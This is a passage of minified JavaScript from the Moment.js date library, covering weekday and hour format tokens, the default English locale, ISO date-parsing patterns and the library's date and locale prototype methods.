        return this.localeData().weekdaysShort(this, e)
    }),
    C("dddd", 0, 0, function(e) {
        return this.localeData().weekdays(this, e)
    }),
    C("e", 0, 0, "weekday"),
    C("E", 0, 0, "isoWeekday"),
    t("day", "d"),
    t("weekday", "e"),
    t("isoWeekday", "E"),
    n("day", 11),
    n("weekday", 11),
    n("isoWeekday", 11),
    O("d", $t),
    O("e", $t),
    O("E", $t),
    O("dd", function(e, t) {
        return t.weekdaysMinRegex(e)
    }),
    O("ddd", function(e, t) {
        return t.weekdaysShortRegex(e)
    }),
    O("dddd", function(e, t) {
        return t.weekdaysRegex(e)
    }),
    I(["dd", "ddd", "dddd"], function(e, t, n, i) {
        var a = n._locale.weekdaysParse(e, i, n._strict);
        null != a ? t.d = a : y(n).invalidWeekday = e
    }),
    I(["d", "e", "E"], function(e, t, n, i) {
        t[i] = b(e)
    });
    var vn = "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_")
      , Mn = "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_")
      , Ln = "Su_Mo_Tu_We_Th_Fr_Sa".split("_")
      , bn = Zt
      , kn = Zt
      , Dn = Zt;
    C("H", ["HH", 2], 0, "hour"),
    C("h", ["hh", 2], 0, Z),
    C("k", ["kk", 2], 0, function() {
        return this.hours() || 24
    }),
    C("hmm", 0, 0, function() {
        return "" + Z.apply(this) + j(this.minutes(), 2)
    }),
    C("hmmss", 0, 0, function() {
        return "" + Z.apply(this) + j(this.minutes(), 2) + j(this.seconds(), 2)
    }),
    C("Hmm", 0, 0, function() {
        return "" + this.hours() + j(this.minutes(), 2)
    }),
    C("Hmmss", 0, 0, function() {
        return "" + this.hours() + j(this.minutes(), 2) + j(this.seconds(), 2)
    }),
    ee("a", !0),
    ee("A", !1),
    t("hour", "h"),
    n("hour", 13),
    O("a", te),
    O("A", te),
    O("H", $t),
    O("h", $t),
    O("HH", $t, Wt),
    O("hh", $t, Wt),
    O("hmm", Bt),
    O("hmmss", qt),
    O("Hmm", Bt),
    O("Hmmss", qt),
    W(["H", "HH"], rn),
    W(["a", "A"], function(e, t, n) {
        n._isPm = n._locale.isPM(e),
        n._meridiem = e
    }),
    W(["h", "hh"], function(e, t, n) {
        t[rn] = b(e),
        y(n).bigHour = !0
    }),
    W("hmm", function(e, t, n) {
        var i = e.length - 2;
        t[rn] = b(e.substr(0, i)),
        t[on] = b(e.substr(i)),
        y(n).bigHour = !0
    }),
    W("hmmss", function(e, t, n) {
        var i = e.length - 4
          , a = e.length - 2;
        t[rn] = b(e.substr(0, i)),
        t[on] = b(e.substr(i, 2)),
        t[ln] = b(e.substr(a)),
        y(n).bigHour = !0
    }),
    W("Hmm", function(e, t, n) {
        var i = e.length - 2;
        t[rn] = b(e.substr(0, i)),
        t[on] = b(e.substr(i))
    }),
    W("Hmmss", function(e, t, n) {
        var i = e.length - 4
          , a = e.length - 2;
        t[rn] = b(e.substr(0, i)),
        t[on] = b(e.substr(i, 2)),
        t[ln] = b(e.substr(a))
    });
    var Yn, wn = i("Hours", !0), Tn = {
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        longDateFormat: {
            LTS: "h:mm:ss A",
            LT: "h:mm A",
            L: "MM/DD/YYYY",
            LL: "MMMM D, YYYY",
            LLL: "MMMM D, YYYY h:mm A",
            LLLL: "dddd, MMMM D, YYYY h:mm A"
        },
        invalidDate: "Invalid date",
        ordinal: "%d",
        ordinalParse: /\d{1,2}/,
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        months: fn,
        monthsShort: pn,
        week: {
            dow: 0,
            doy: 6
        },
        weekdays: vn,
        weekdaysMin: Ln,
        weekdaysShort: Mn,
        meridiemParse: /[ap]\.?m?\.?/i
    }, Sn = {}, xn = {}, Hn = /^\s*((?:[+-]\d{6}|\d{4})-(?:\d\d-\d\d|W\d\d-\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?::\d\d(?::\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, En = /^\s*((?:[+-]\d{6}|\d{4})(?:\d\d\d\d|W\d\d\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?:\d\d(?:\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, jn = /Z|[+-]\d\d(?::?\d\d)?/, Cn = [["YYYYYY-MM-DD", /[+-]\d{6}-\d\d-\d\d/], ["YYYY-MM-DD", /\d{4}-\d\d-\d\d/], ["GGGG-[W]WW-E", /\d{4}-W\d\d-\d/], ["GGGG-[W]WW", /\d{4}-W\d\d/, !1], ["YYYY-DDD", /\d{4}-\d{3}/], ["YYYY-MM", /\d{4}-\d\d/, !1], ["YYYYYYMMDD", /[+-]\d{10}/], ["YYYYMMDD", /\d{8}/], ["GGGG[W]WWE", /\d{4}W\d{3}/], ["GGGG[W]WW", /\d{4}W\d{2}/, !1], ["YYYYDDD", /\d{7}/]], An = [["HH:mm:ss.SSSS", /\d\d:\d\d:\d\d\.\d+/], ["HH:mm:ss,SSSS", /\d\d:\d\d:\d\d,\d+/], ["HH:mm:ss", /\d\d:\d\d:\d\d/], ["HH:mm", /\d\d:\d\d/], ["HHmmss.SSSS", /\d\d\d\d\d\d\.\d+/], ["HHmmss,SSSS", /\d\d\d\d\d\d,\d+/], ["HHmmss", /\d\d\d\d\d\d/], ["HHmm", /\d\d\d\d/], ["HH", /\d\d/]], Pn = /^\/?Date\((\-?\d+)/i;
    _.createFromInputFallback = e("value provided is not in a recognized ISO format. moment construction falls back to js Date(), which is not reliable across all browsers and versions. Non ISO date formats are discouraged and will be removed in an upcoming major release. Please refer to http://momentjs.com/guides/#/warnings/js-date/ for more info.", function(e) {
        e._d = new Date(e._i + (e._useUTC ? " UTC" : ""))
    }),
    _.ISO_8601 = function() {}
    ;
    var On = e("moment().min is deprecated, use moment.max instead. http://momentjs.com/guides/#/warnings/min-max/", function() {
        var e = fe.apply(null, arguments);
        return this.isValid() && e.isValid() ? e < this ? this : e : m()
    })
      , Nn = e("moment().max is deprecated, use moment.min instead. http://momentjs.com/guides/#/warnings/min-max/", function() {
        var e = fe.apply(null, arguments);
        return this.isValid() && e.isValid() ? this < e ? this : e : m()
    });
    ve("Z", ":"),
    ve("ZZ", ""),
    O("Z", Qt),
    O("ZZ", Qt),
    W(["Z", "ZZ"], function(e, t, n) {
        n._useUTC = !0,
        n._tzm = Me(Qt, e)
    });
    var Fn = /([\+\-]|\d\d)/gi;
    _.updateOffset = function() {}
    ;
    var Wn = /^(\-)?(?:(\d*)[. ])?(\d+)\:(\d+)(?:\:(\d+)(\.\d*)?)?$/
      , In = /^(-)?P(?:(-?[0-9,.]*)Y)?(?:(-?[0-9,.]*)M)?(?:(-?[0-9,.]*)W)?(?:(-?[0-9,.]*)D)?(?:T(?:(-?[0-9,.]*)H)?(?:(-?[0-9,.]*)M)?(?:(-?[0-9,.]*)S)?)?$/;
    De.fn = _e.prototype;
    var zn = Te(1, "add")
      , Rn = Te(-1, "subtract");
    _.defaultFormat = "YYYY-MM-DDTHH:mm:ssZ",
    _.defaultFormatUtc = "YYYY-MM-DDTHH:mm:ss[Z]";
    var $n = e("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.", function(e) {
        return void 0 === e ? this.localeData() : this.locale(e)
    });
    C(0, ["gg", 2], 0, function() {
        return this.weekYear() % 100
    }),
    C(0, ["GG", 2], 0, function() {
        return this.isoWeekYear() % 100
    }),
    Ee("gggg", "weekYear"),
    Ee("ggggg", "weekYear"),
    Ee("GGGG", "isoWeekYear"),
    Ee("GGGGG", "isoWeekYear"),
    t("weekYear", "gg"),
    t("isoWeekYear", "GG"),
    n("weekYear", 1),
    n("isoWeekYear", 1),
    O("G", Xt),
    O("g", Xt),
    O("GG", $t, Wt),
    O("gg", $t, Wt),
    O("GGGG", Jt, zt),
    O("gggg", Jt, zt),
    O("GGGGG", Vt, Rt),
    O("ggggg", Vt, Rt),
    I(["gggg", "ggggg", "GGGG", "GGGGG"], function(e, t, n, i) {
        t[i.substr(0, 2)] = b(e)
    }),
    I(["gg", "GG"], function(e, t, n, i) {
        t[i] = _.parseTwoDigitYear(e)
    }),
    C("Q", 0, "Qo", "quarter"),
    t("quarter", "Q"),
    n("quarter", 7),
    O("Q", Ft),
    W("Q", function(e, t) {
        t[an] = 3 * (b(e) - 1)
    }),
    C("D", ["DD", 2], "Do", "date"),
    t("date", "D"),
    n("date", 9),
    O("D", $t),
    O("DD", $t, Wt),
    O("Do", function(e, t) {
        return e ? t._ordinalParse : t._ordinalParseLenient
    }),
    W(["D", "DD"], sn),
    W("Do", function(e, t) {
        t[sn] = b(e.match($t)[0])
    });
    var Bn = i("Date", !0);
    C("DDD", ["DDDD", 3], "DDDo", "dayOfYear"),
    t("dayOfYear", "DDD"),
    n("dayOfYear", 4),
    O("DDD", Ut),
    O("DDDD", It),
    W(["DDD", "DDDD"], function(e, t, n) {
        n._dayOfYear = b(e)
    }),
    C("m", ["mm", 2], 0, "minute"),
    t("minute", "m"),
    n("minute", 14),
    O("m", $t),
    O("mm", $t, Wt),
    W(["m", "mm"], on);
    var qn = i("Minutes", !1);
    C("s", ["ss", 2], 0, "second"),
    t("second", "s"),
    n("second", 15),
    O("s", $t),
    O("ss", $t, Wt),
    W(["s", "ss"], ln);
    var Un, Jn = i("Seconds", !1);
    for (C("S", 0, 0, function() {
        return ~~(this.millisecond() / 100)
    }),
    C(0, ["SS", 2], 0, function() {
        return ~~(this.millisecond() / 10)
    }),
    C(0, ["SSS", 3], 0, "millisecond"),
    C(0, ["SSSS", 4], 0, function() {
        return 10 * this.millisecond()
    }),
    C(0, ["SSSSS", 5], 0, function() {
        return 100 * this.millisecond()
    }),
    C(0, ["SSSSSS", 6], 0, function() {
        return 1e3 * this.millisecond()
    }),
    C(0, ["SSSSSSS", 7], 0, function() {
        return 1e4 * this.millisecond()
    }),
    C(0, ["SSSSSSSS", 8], 0, function() {
        return 1e5 * this.millisecond()
    }),
    C(0, ["SSSSSSSSS", 9], 0, function() {
        return 1e6 * this.millisecond()
    }),
    t("millisecond", "ms"),
    n("millisecond", 16),
    O("S", Ut, Ft),
    O("SS", Ut, Wt),
    O("SSS", Ut, It),
    Un = "SSSS"; Un.length <= 9; Un += "S")
        O(Un, Gt);
    for (Un = "S"; Un.length <= 9; Un += "S")
        W(Un, function(e, t) {
            t[dn] = b(1e3 * ("0." + e))
        });
    var Vn = i("Milliseconds", !1);
    C("z", 0, 0, "zoneAbbr"),
    C("zz", 0, 0, "zoneName");
    var Gn = v.prototype;
    Gn.add = zn,
    Gn.calendar = function(e, t) {
        var n = e || fe()
          , i = Le(n, this).startOf("day")
          , a = _.calendarFormat(this, i) || "sameElse"
          , s = t && (w(t[a]) ? t[a].call(this, n) : t[a]);
        return this.format(s || this.localeData().calendar(a, this, fe(n)))
    }
    ,
    Gn.clone = function() {
        return new v(this)
    }
    ,
    Gn.diff = function(e, t, n) {
        var i, a, s, r, o, l, d, u;
        return this.isValid() ? (i = Le(e, this)).isValid() ? (a = 6e4 * (i.utcOffset() - this.utcOffset()),
        "year" === (t = S(t)) || "month" === t || "quarter" === t ? (o = this,
        d = 12 * ((l = i).year() - o.year()) + (l.month() - o.month()),
        u = o.clone().add(d, "months"),
        r = -(d + (l - u < 0 ? (l - u) / (u - o.clone().add(d - 1, "months")) : (l - u) / (o.clone().add(1 + d, "months") - u))) || 0,
        "quarter" === t ? r /= 3 : "year" === t && (r /= 12)) : (s = this - i,
        r = "second" === t ? s / 1e3 : "minute" === t ? s / 6e4 : "hour" === t ? s / 36e5 : "day" === t ? (s - a) / 864e5 : "week" === t ? (s - a) / 6048e5 : s),
        n ? r : L(r)) : NaN : NaN
    }
    ,
    Gn.endOf = function(e) {
        return void 0 === (e = S(e)) || "millisecond" === e ? this : ("date" === e && (e = "day"),
        this.startOf(e).add(1, "isoWeek" === e ? "week" : e).subtract(1, "ms"))
    }
    ,
    Gn.format = function(e) {
        e = e || (this.isUtc() ? _.defaultFormatUtc : _.defaultFormat);
        var t = A(this, e);
        return this.localeData().postformat(t)
    }
    ,
    Gn.from = function(e, t) {
        return this.isValid() && (M(e) && e.isValid() || fe(e).isValid()) ? De({
            to: this,
            from: e
        }).locale(this.locale()).humanize(!t) : this.localeData().invalidDate()
    }
    ,
    Gn.fromNow = function(e) {
        return this.from(fe(), e)
    }
    ,
    Gn.to = function(e, t) {
        return this.isValid() && (M(e) && e.isValid() || fe(e).isValid()) ? De({
            from: this,
            to: e
        }).locale(this.locale()).humanize(!t) : this.localeData().invalidDate()
    }
    ,
    Gn.toNow = function(e) {
        return this.to(fe(), e)
    }
    ,
    Gn.get = function(e) {
        return w(this[e = S(e)]) ? this[e]() : this
    }
    ,
    Gn.invalidAt = function() {
        return y(this).overflow
    }
    ,
    Gn.isAfter = function(e, t) {
        var n = M(e) ? e : fe(e);
        return !(!this.isValid() || !n.isValid()) && ("millisecond" === (t = S(f(t) ? "millisecond" : t)) ? this.valueOf() > n.valueOf() : n.valueOf() < this.clone().startOf(t).valueOf())
    }
    ,
    Gn.isBefore = function(e, t) {
        var n = M(e) ? e : fe(e);
        return !(!this.isValid() || !n.isValid()) && ("millisecond" === (t = S(f(t) ? "millisecond" : t)) ? this.valueOf() < n.valueOf() : this.clone().endOf(t).valueOf() < n.valueOf())
    }
    ,
    Gn.isBetween = function(e, t, n, i) {
        return ("(" === (i = i || "()")[0] ? this.isAfter(e, n) : !this.isBefore(e, n)) && (")" === i[1] ? this.isBefore(t, n) : !this.isAfter(t, n))
    }
    ,
    Gn.isSame = function(e, t) {
        var n, i = M(e) ? e : fe(e);
        return !(!this.isValid() || !i.isValid()) && ("millisecond" === (t = S(t || "millisecond")) ? this.valueOf() === i.valueOf() : (n = i.valueOf(),
        this.clone().startOf(t).valueOf() <= n && n <= this.clone().endOf(t).valueOf()))
    }
    ,
    Gn.isSameOrAfter = function(e, t) {
        return this.isSame(e, t) || this.isAfter(e, t)
    }
    ,
    Gn.isSameOrBefore = function(e, t) {
        return this.isSame(e, t) || this.isBefore(e, t)
    }
    ,
    Gn.isValid = function() {
        return h(this)
    }
    ,
    Gn.lang = $n,
    Gn.locale = xe,
    Gn.localeData = He,
    Gn.max = Nn,
    Gn.min = On,
    Gn.parsingFlags = function() {
        return d({}, y(this))
    }
    ,
    Gn.set = function(e, t) {
        if ("object" == typeof e)
            for (var n = function(e) {
                var t = [];
                for (var n in e)
                    t.push({
                        unit: n,
                        priority: Ct[n]
                    });
                return t.sort(function(e, t) {
                    return e.priority - t.priority
                }),
                t
            }(e = x(e)), i = 0; i < n.length; i++)
                this[n[i].unit](e[n[i].unit]);
        else if (w(this[e = S(e)]))
            return this[e](t);
        return this
    }
    ,
    Gn.startOf = function(e) {
        switch (e = S(e)) {
        case "year":
            this.month(0);
        case "quarter":
        case "month":
            this.date(1);
        case "week":
        case "isoWeek":
        case "day":
        case "date":
            this.hours(0);
        case "hour":
            this.minutes(0);
        case "minute":
            this.seconds(0);
        case "second":
            this.milliseconds(0)
        }
        return "week" === e && this.weekday(0),
        "isoWeek" === e && this.isoWeekday(1),
        "quarter" === e && this.month(3 * Math.floor(this.month() / 3)),
        this
    }
    ,
    Gn.subtract = Rn,
    Gn.toArray = function() {
        var e = this;
        return [e.year(), e.month(), e.date(), e.hour(), e.minute(), e.second(), e.millisecond()]
    }
    ,
    Gn.toObject = function() {
        var e = this;
        return {
            years: e.year(),
            months: e.month(),
            date: e.date(),
            hours: e.hours(),
            minutes: e.minutes(),
            seconds: e.seconds(),
            milliseconds: e.milliseconds()
        }
    }
    ,
    Gn.toDate = function() {
        return new Date(this.valueOf())
    }
    ,
    Gn.toISOString = function() {
        var e = this.clone().utc();
        return 0 < e.year() && e.year() <= 9999 ? w(Date.prototype.toISOString) ? this.toDate().toISOString() : A(e, "YYYY-MM-DD[T]HH:mm:ss.SSS[Z]") : A(e, "YYYYYY-MM-DD[T]HH:mm:ss.SSS[Z]")
    }
    ,
    Gn.inspect = function() {
        if (!this.isValid())
            return "moment.invalid(/* " + this._i + " */)";
        var e = "moment"
          , t = "";
        this.isLocal() || (e = 0 === this.utcOffset() ? "moment.utc" : "moment.parseZone",
        t = "Z");
        var n = "[" + e + '("]'
          , i = 0 < this.year() && this.year() <= 9999 ? "YYYY" : "YYYYYY"
          , a = t + '[")]';
        return this.format(n + i + "-MM-DD[T]HH:mm:ss.SSS" + a)
    }
    ,
    Gn.toJSON = function() {
        return this.isValid() ? this.toISOString() : null
    }
    ,
    Gn.toString = function() {
        return this.clone().locale("en").format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ")
    }
    ,
    Gn.unix = function() {
        return Math.floor(this.valueOf() / 1e3)
    }
    ,
    Gn.valueOf = function() {
        return this._d.valueOf() - 6e4 * (this._offset || 0)
    }
    ,
    Gn.creationData = function() {
        return {
            input: this._i,
            format: this._f,
            locale: this._locale,
            isUTC: this._isUTC,
            strict: this._strict
        }
    }
    ,
    Gn.year = yn,
    Gn.isLeapYear = function() {
        return U(this.year())
    }
    ,
    Gn.weekYear = function(e) {
        return je.call(this, e, this.week(), this.weekday(), this.localeData()._week.dow, this.localeData()._week.doy)
    }
    ,
    Gn.isoWeekYear = function(e) {
        return je.call(this, e, this.isoWeek(), this.isoWeekday(), 1, 4)
    }
    ,
    Gn.quarter = Gn.quarters = function(e) {
        return null == e ? Math.ceil((this.month() + 1) / 3) : this.month(3 * (e - 1) + this.month() % 3)
    }
    ,
    Gn.month = $,
    Gn.daysInMonth = function() {
        return z(this.year(), this.month())
    }
    ,
    Gn.week = Gn.weeks = function(e) {
        var t = this.localeData().week(this);
        return null == e ? t : this.add(7 * (e - t), "d")
    }
    ,
    Gn.isoWeek = Gn.isoWeeks = function(e) {
        var t = X(this, 1, 4).week;
        return null == e ? t : this.add(7 * (e - t), "d")
    }
    ,
    Gn.weeksInYear = function() {
        var e = this.localeData()._week;
        return K(this.year(), e.dow, e.doy)
    }
    ,
    Gn.isoWeeksInYear = function() {
        return K(this.year(), 1, 4)
    }
    ,
    Gn.date = Bn,
    Gn.day = Gn.days = function(e) {
        if (!this.isValid())
            return null != e ? this : NaN;
        var t, n, i = this._isUTC ? this._d.getUTCDay() : this._d.getDay();
        return null != e ? (t = e,
        n = this.localeData(),
        e = "string" != typeof t ? t : isNaN(t) ? "number" == typeof (t = n.weekdaysParse(t)) ? t : null : parseInt(t, 10),
        this.add(e - i, "d")) : i
    }
    ,
    Gn.weekday = function(e) {
        if (!this.isValid())
            return null != e ? this : NaN;
        var t = (this.day() + 7 - this.localeData()._week.dow) % 7;
        return null == e ? t : this.add(e - t, "d")
    }
    ,
    Gn.isoWeekday = function(e) {
        if (!this.isValid())
            return null != e ? this : NaN;
        if (null == e)
            return this.day() || 7;
        var t, n, i = (t = e,
        n = this.localeData(),
        "string" == typeof t ? n.weekdaysParse(t) % 7 || 7 : isNaN(t) ? null : t);
        return this.day(this.day() % 7 ? i : i - 7)
    }
    ,
    Gn.dayOfYear = function(e) {
        var t = Math.round((this.clone().startOf("day") - this.clone().startOf("year")) / 864e5) + 1;
        return null == e ? t : this.add(e - t, "d")
    }
    ,
    Gn.hour = Gn.hours = wn,
    Gn.minute = Gn.minutes = qn,
    Gn.second = Gn.seconds = Jn,
    Gn.millisecond = Gn.milliseconds = Vn,
    Gn.utcOffset = function(e, t) {
        var n, i = this._offset || 0;
        if (!this.isValid())
            return null != e ? this : NaN;
        if (null == e)
            return this._isUTC ? i : be(this);
        if ("string" == typeof e) {
            if (null === (e = Me(Qt, e)))
                return this
        } else
            Math.abs(e) < 16 && (e *= 60);
        return !this._isUTC && t && (n = be(this)),
        this._offset = e,
        this._isUTC = !0,
        null != n && this.add(n, "m"),
        i !== e && (!t || this._changeInProgress ? Se(this, De(e - i, "m"), 1, !1) : this._changeInProgress || (this._changeInProgress = !0,
        _.updateOffset(this, !0),
        this._changeInProgress = null)),
        this
    }
    ,
    Gn.utc = function(e) {
        return this.utcOffset(0, e)
    }
    ,
    Gn.local = function(e) {
        return this._isUTC && (this.utcOffset(0, e),
        this._isUTC = !1,
        e && this.subtract(be(this), "m")),
        this
    }
    ,
    Gn.parseZone = function() {
        if (null != this._tzm)
            this.utcOffset(this._tzm);
        else if ("string" == typeof this._i) {
            var e = Me(Kt, this._i);
            null != e ? this.utcOffset(e) : this.utcOffset(0, !0)
        }
        return this
    }
    ,
    Gn.hasAlignedHourOffset = function(e) {
        return !!this.isValid() && (e = e ? fe(e).utcOffset() : 0,
        (this.utcOffset() - e) % 60 == 0)
    }
    ,
    Gn.isDST = function() {
        return this.utcOffset() > this.clone().month(0).utcOffset() || this.utcOffset() > this.clone().month(5).utcOffset()
    }
    ,
    Gn.isLocal = function() {
        return !!this.isValid() && !this._isUTC
    }
    ,
    Gn.isUtcOffset = function() {
        return !!this.isValid() && this._isUTC
    }
    ,
    Gn.isUtc = ke,
    Gn.isUTC = ke,
    Gn.zoneAbbr = function() {
        return this._isUTC ? "UTC" : ""
    }
    ,
    Gn.zoneName = function() {
        return this._isUTC ? "Coordinated Universal Time" : ""
    }
    ,
    Gn.dates = e("dates accessor is deprecated. Use date instead.", Bn),
    Gn.months = e("months accessor is deprecated. Use month instead", $),
    Gn.years = e("years accessor is deprecated. Use year instead", yn),
    Gn.zone = e("moment().zone is deprecated, use moment().utcOffset instead. http://momentjs.com/guides/#/warnings/zone/", function(e, t) {
        return null != e ? ("string" != typeof e && (e = -e),
        this.utcOffset(e, t),
        this) : -this.utcOffset()
    }),
    Gn.isDSTShifted = e("isDSTShifted is deprecated. See http://momentjs.com/guides/#/warnings/dst-shifted/ for more information", function() {
        if (!f(this._isDSTShifted))
            return this._isDSTShifted;
        var e = {};
        if (p(e, this),
        (e = he(e))._a) {
            var t = (e._isUTC ? c : fe)(e._a);
            this._isDSTShifted = this.isValid() && 0 < k(e._a, t.toArray())
        } else
            this._isDSTShifted = !1;
        return this._isDSTShifted
    });
    var Xn = T.prototype;
    Xn.calendar = function(e, t, n) {
        var i = this._calendar[e] || this._calendar.sameElse;
        return w(i) ? i.call(t, n) : i
    }
    ,
    Xn.longDateFormat = function(e) {
        var t = this._longDateFormat[e]
          , n = this._longDateFormat[e.toUpperCase()];
        return t || !n ? t : (this._longDateFormat[e] = n.replace(/MMMM|MM|DD|dddd/g, function(e) {
            return e.slice(1)
        }),
        this._longDateFormat[e])
    }
    ,
    Xn.invalidDate = function() {
        return this._invalidDate
    }
    ,
    Xn.ordinal = function(e) {
        return this._ordinal.replace("%d", e)
    }
    ,
    Xn.preparse = Ce,
    Xn.postformat = Ce,
    Xn.relativeTime = function(e, t, n, i) {
        var a = this._relativeTime[n];
        return w(a) ? a(e, t, n, i) : a.replace(/%d/i, e)
    }
    ,
    Xn.pastFuture = function(e, t) {
        var n = this._relativeTime[0 < e ? "future" : "past"];
        return w(n) ? n(t) : n.replace(/%s/i, t)
    }
    ,
    Xn.set = function(e) {
        var t, n;
        for (n in e)
            w(t = e[n]) ? this[n] = t : this["_" + n] = t;
        this._config = e,
        this._ordinalParseLenient = new RegExp(this._ordinalParse.source + "|" + /\d{1,2}/.source)
    }
    ,
    Xn.months = function(e, t) {
        return e ? o(this._months) ? this._months[e.month()] : this._months[(this._months.isFormat || mn).test(t) ? "format" : "standalone"][e.month()] : this._months
    }
    ,
    Xn.monthsShort = function(e, t) {
        return e ? o(this._monthsShort) ? this._monthsShort[e.month()] : this._monthsShort[mn.test(t) ? "format" : "standalone"][e.month()] : this._monthsShort
    }
    ,
    Xn.monthsParse = function(e, t, n) {
        var i, a, s;
        if (this._monthsParseExact)
            return function(e, t, n) {
                var i, a, s, r = e.toLocaleLowerCase();
                if (!this._monthsParse)
                    for (this._monthsParse = [],
                    this._longMonthsParse = [],
                    this._shortMonthsParse = [],
                    i = 0; i < 12; ++i)
                        s = c([2e3, i]),
                        this._shortMonthsParse[i] = this.monthsShort(s, "").toLocaleLowerCase(),
                        this._longMonthsParse[i] = this.months(s, "").toLocaleLowerCase();
                return n ? -1 !== (a = "MMM" === t ? hn.call(this._shortMonthsParse, r) : hn.call(this._longMonthsParse, r)) ? a : null : "MMM" === t ? -1 !== (a = hn.call(this._shortMonthsParse, r)) ? a : -1 !== (a = hn.call(this._longMonthsParse, r)) ? a : null : -1 !== (a = hn.call(this._longMonthsParse, r)) ? a : -1 !== (a = hn.call(this._shortMonthsParse, r)) ? a : null
            }
            .call(this, e, t, n);
        for (this._monthsParse || (this._monthsParse = [],
        this._longMonthsParse = [],
        this._shortMonthsParse = []),
        i = 0; i < 12; i++) {
            if (a = c([2e3, i]),
            n && !this._longMonthsParse[i] && (this._longMonthsParse[i] = new RegExp("^" + this.months(a, "").replace(".", "") + "$","i"),
            this._shortMonthsParse[i] = new RegExp("^" + this.monthsShort(a, "").replace(".", "") + "$","i")),
            n || this._monthsParse[i] || (s = "^" + this.months(a, "") + "|^" + this.monthsShort(a, ""),
            this._monthsParse[i] = new RegExp(s.replace(".", ""),"i")),
            n && "MMMM" === t && this._longMonthsParse[i].test(e))
                return i;
            if (n && "MMM" === t && this._shortMonthsParse[i].test(e))
                return i;
            if (!n && this._monthsParse[i].test(e))
                return i
        }
    }
    ,
    Xn.monthsRegex = function(e) {
        return this._monthsParseExact ? (g(this, "_monthsRegex") || B.call(this),
        e ? this._monthsStrictRegex : this._monthsRegex) : (g(this, "_monthsRegex") || (this._monthsRegex = gn),
        this._monthsStrictRegex && e ? this._monthsStrictRegex : this._monthsRegex)
    }
    ,
    Xn.monthsShortRegex = function(e) {
        return this._monthsParseExact ? (g(this, "_monthsRegex") || B.call(this),
        e ? this._monthsShortStrictRegex : this._monthsShortRegex) : (g(this, "_monthsShortRegex") || (this._monthsShortRegex = _n),
        this._monthsShortStrictRegex && e ? this._monthsShortStrictRegex : this._monthsShortRegex)
    }
    ,
    Xn.week = function(e) {
        return X(e, this._week.dow, this._week.doy).week
    }
    ,
    Xn.firstDayOfYear = function() {
        return this._week.doy
    }
    ,
    Xn.firstDayOfWeek = function() {
        return this._week.dow
    }
    ,
    Xn.weekdays = function(e, t) {
        return e ? o(this._weekdays) ? this._weekdays[e.day()] : this._weekdays[this._weekdays.isFormat.test(t) ? "format" : "standalone"][e.day()] : this._weekdays
    }
    ,
    Xn.weekdaysMin = function(e) {
        return e ? this._weekdaysMin[e.day()] : this._weekdaysMin
    }
    ,
    Xn.weekdaysShort = function(e) {
        return e ? this._weekdaysShort[e.day()] : this._weekdaysShort
    }
    ,
    Xn.weekdaysParse = function(e, t, n) {
        var i, a, s;
        if (this._weekdaysParseExact)
            return function(e, t, n) {
                var i, a, s, r = e.toLocaleLowerCase();
                if (!this._weekdaysParse)
                    for (this._weekdaysParse = [],
                    this._shortWeekdaysParse = [],
                    this._minWeekdaysParse = [],
                    i = 0; i < 7; ++i)
                        s = c([2e3, 1]).day(i),
                        this._minWeekdaysParse[i] = this.weekdaysMin(s, "").toLocaleLowerCase(),
                        this._shortWeekdaysParse[i] = this.weekdaysShort(s, "").toLocaleLowerCase(),
                        this._weekdaysParse[i] = this.weekdays(s, "").toLocaleLowerCase();
                return n ? -1 !== (a = "dddd" === t ? hn.call(this._weekdaysParse, r) : "ddd" === t ? hn.call(this._shortWeekdaysParse, r) : hn.call(this._minWeekdaysParse, r)) ? a : null : "dddd" === t ? -1 !== (a = hn.call(this._weekdaysParse, r)) ? a : -1 !== (a = hn.call(this._shortWeekdaysParse, r)) ? a : -1 !== (a = hn.call(this._minWeekdaysParse, r)) ? a : null : "ddd" === t ? -1 !== (a = hn.call(this._shortWeekdaysParse, r)) ? a : -1 !== (a = hn.call(this._weekdaysParse, r)) ? a : -1 !== (a = hn.call(this._minWeekdaysParse, r)) ? a : null : -1 !== (a = hn.call(this._minWeekdaysParse, r)) ? a : -1 !== (a = hn.call(this._weekdaysParse, r)) ? a : -1 !== (a = hn.call(this._shortWeekdaysParse, r)) ? a : null
            }
            .call(this, e, t, n);
        for (this._weekdaysParse || (this._weekdaysParse = [],
        this._minWeekdaysParse = [],
        this._shortWeekdaysParse = [],
        this._fullWeekdaysParse = []),
        i = 0; i < 7; i++) {
            if (a = c([2e3, 1]).day(i),
            n && !this._fullWeekdaysParse[i] && (this._fullWeekdaysParse[i] = new RegExp("^" + this.weekdays(a, "").replace(".", ".?") + "$","i"),
            this._shortWeekdaysParse[i] = new RegExp("^" + this.weekdaysShort(a, "").replace(".", ".?") + "$","i"),
            this._minWeekdaysParse[i] = new RegExp("^" + this.weekdaysMin(a, "").replace(".", ".?") + "$","i")),
            this._weekdaysParse[i] || (s = "^" + this.weekdays(a, "") + "|^" + this.weekdaysShort(a, "") + "|^" + this.weekdaysMin(a, ""),
            this._weekdaysParse[i] = new RegExp(s.replace(".", ""),"i")),
            n && "dddd" === t && this._fullWeekdaysParse[i].test(e))
                return i;
            if (n && "ddd" === t && this._shortWeekdaysParse[i].test(e))
                return i;
            if (n && "dd" === t && this._minWeekdaysParse[i].test(e))
                return i;
            if (!n && this._weekdaysParse[i].test(e))
                return i
        }
    }
    ,
    Xn.weekdaysRegex = function(e) {
        return this._weekdaysParseExact ? (g(this, "_weekdaysRegex") || Q.call(this),
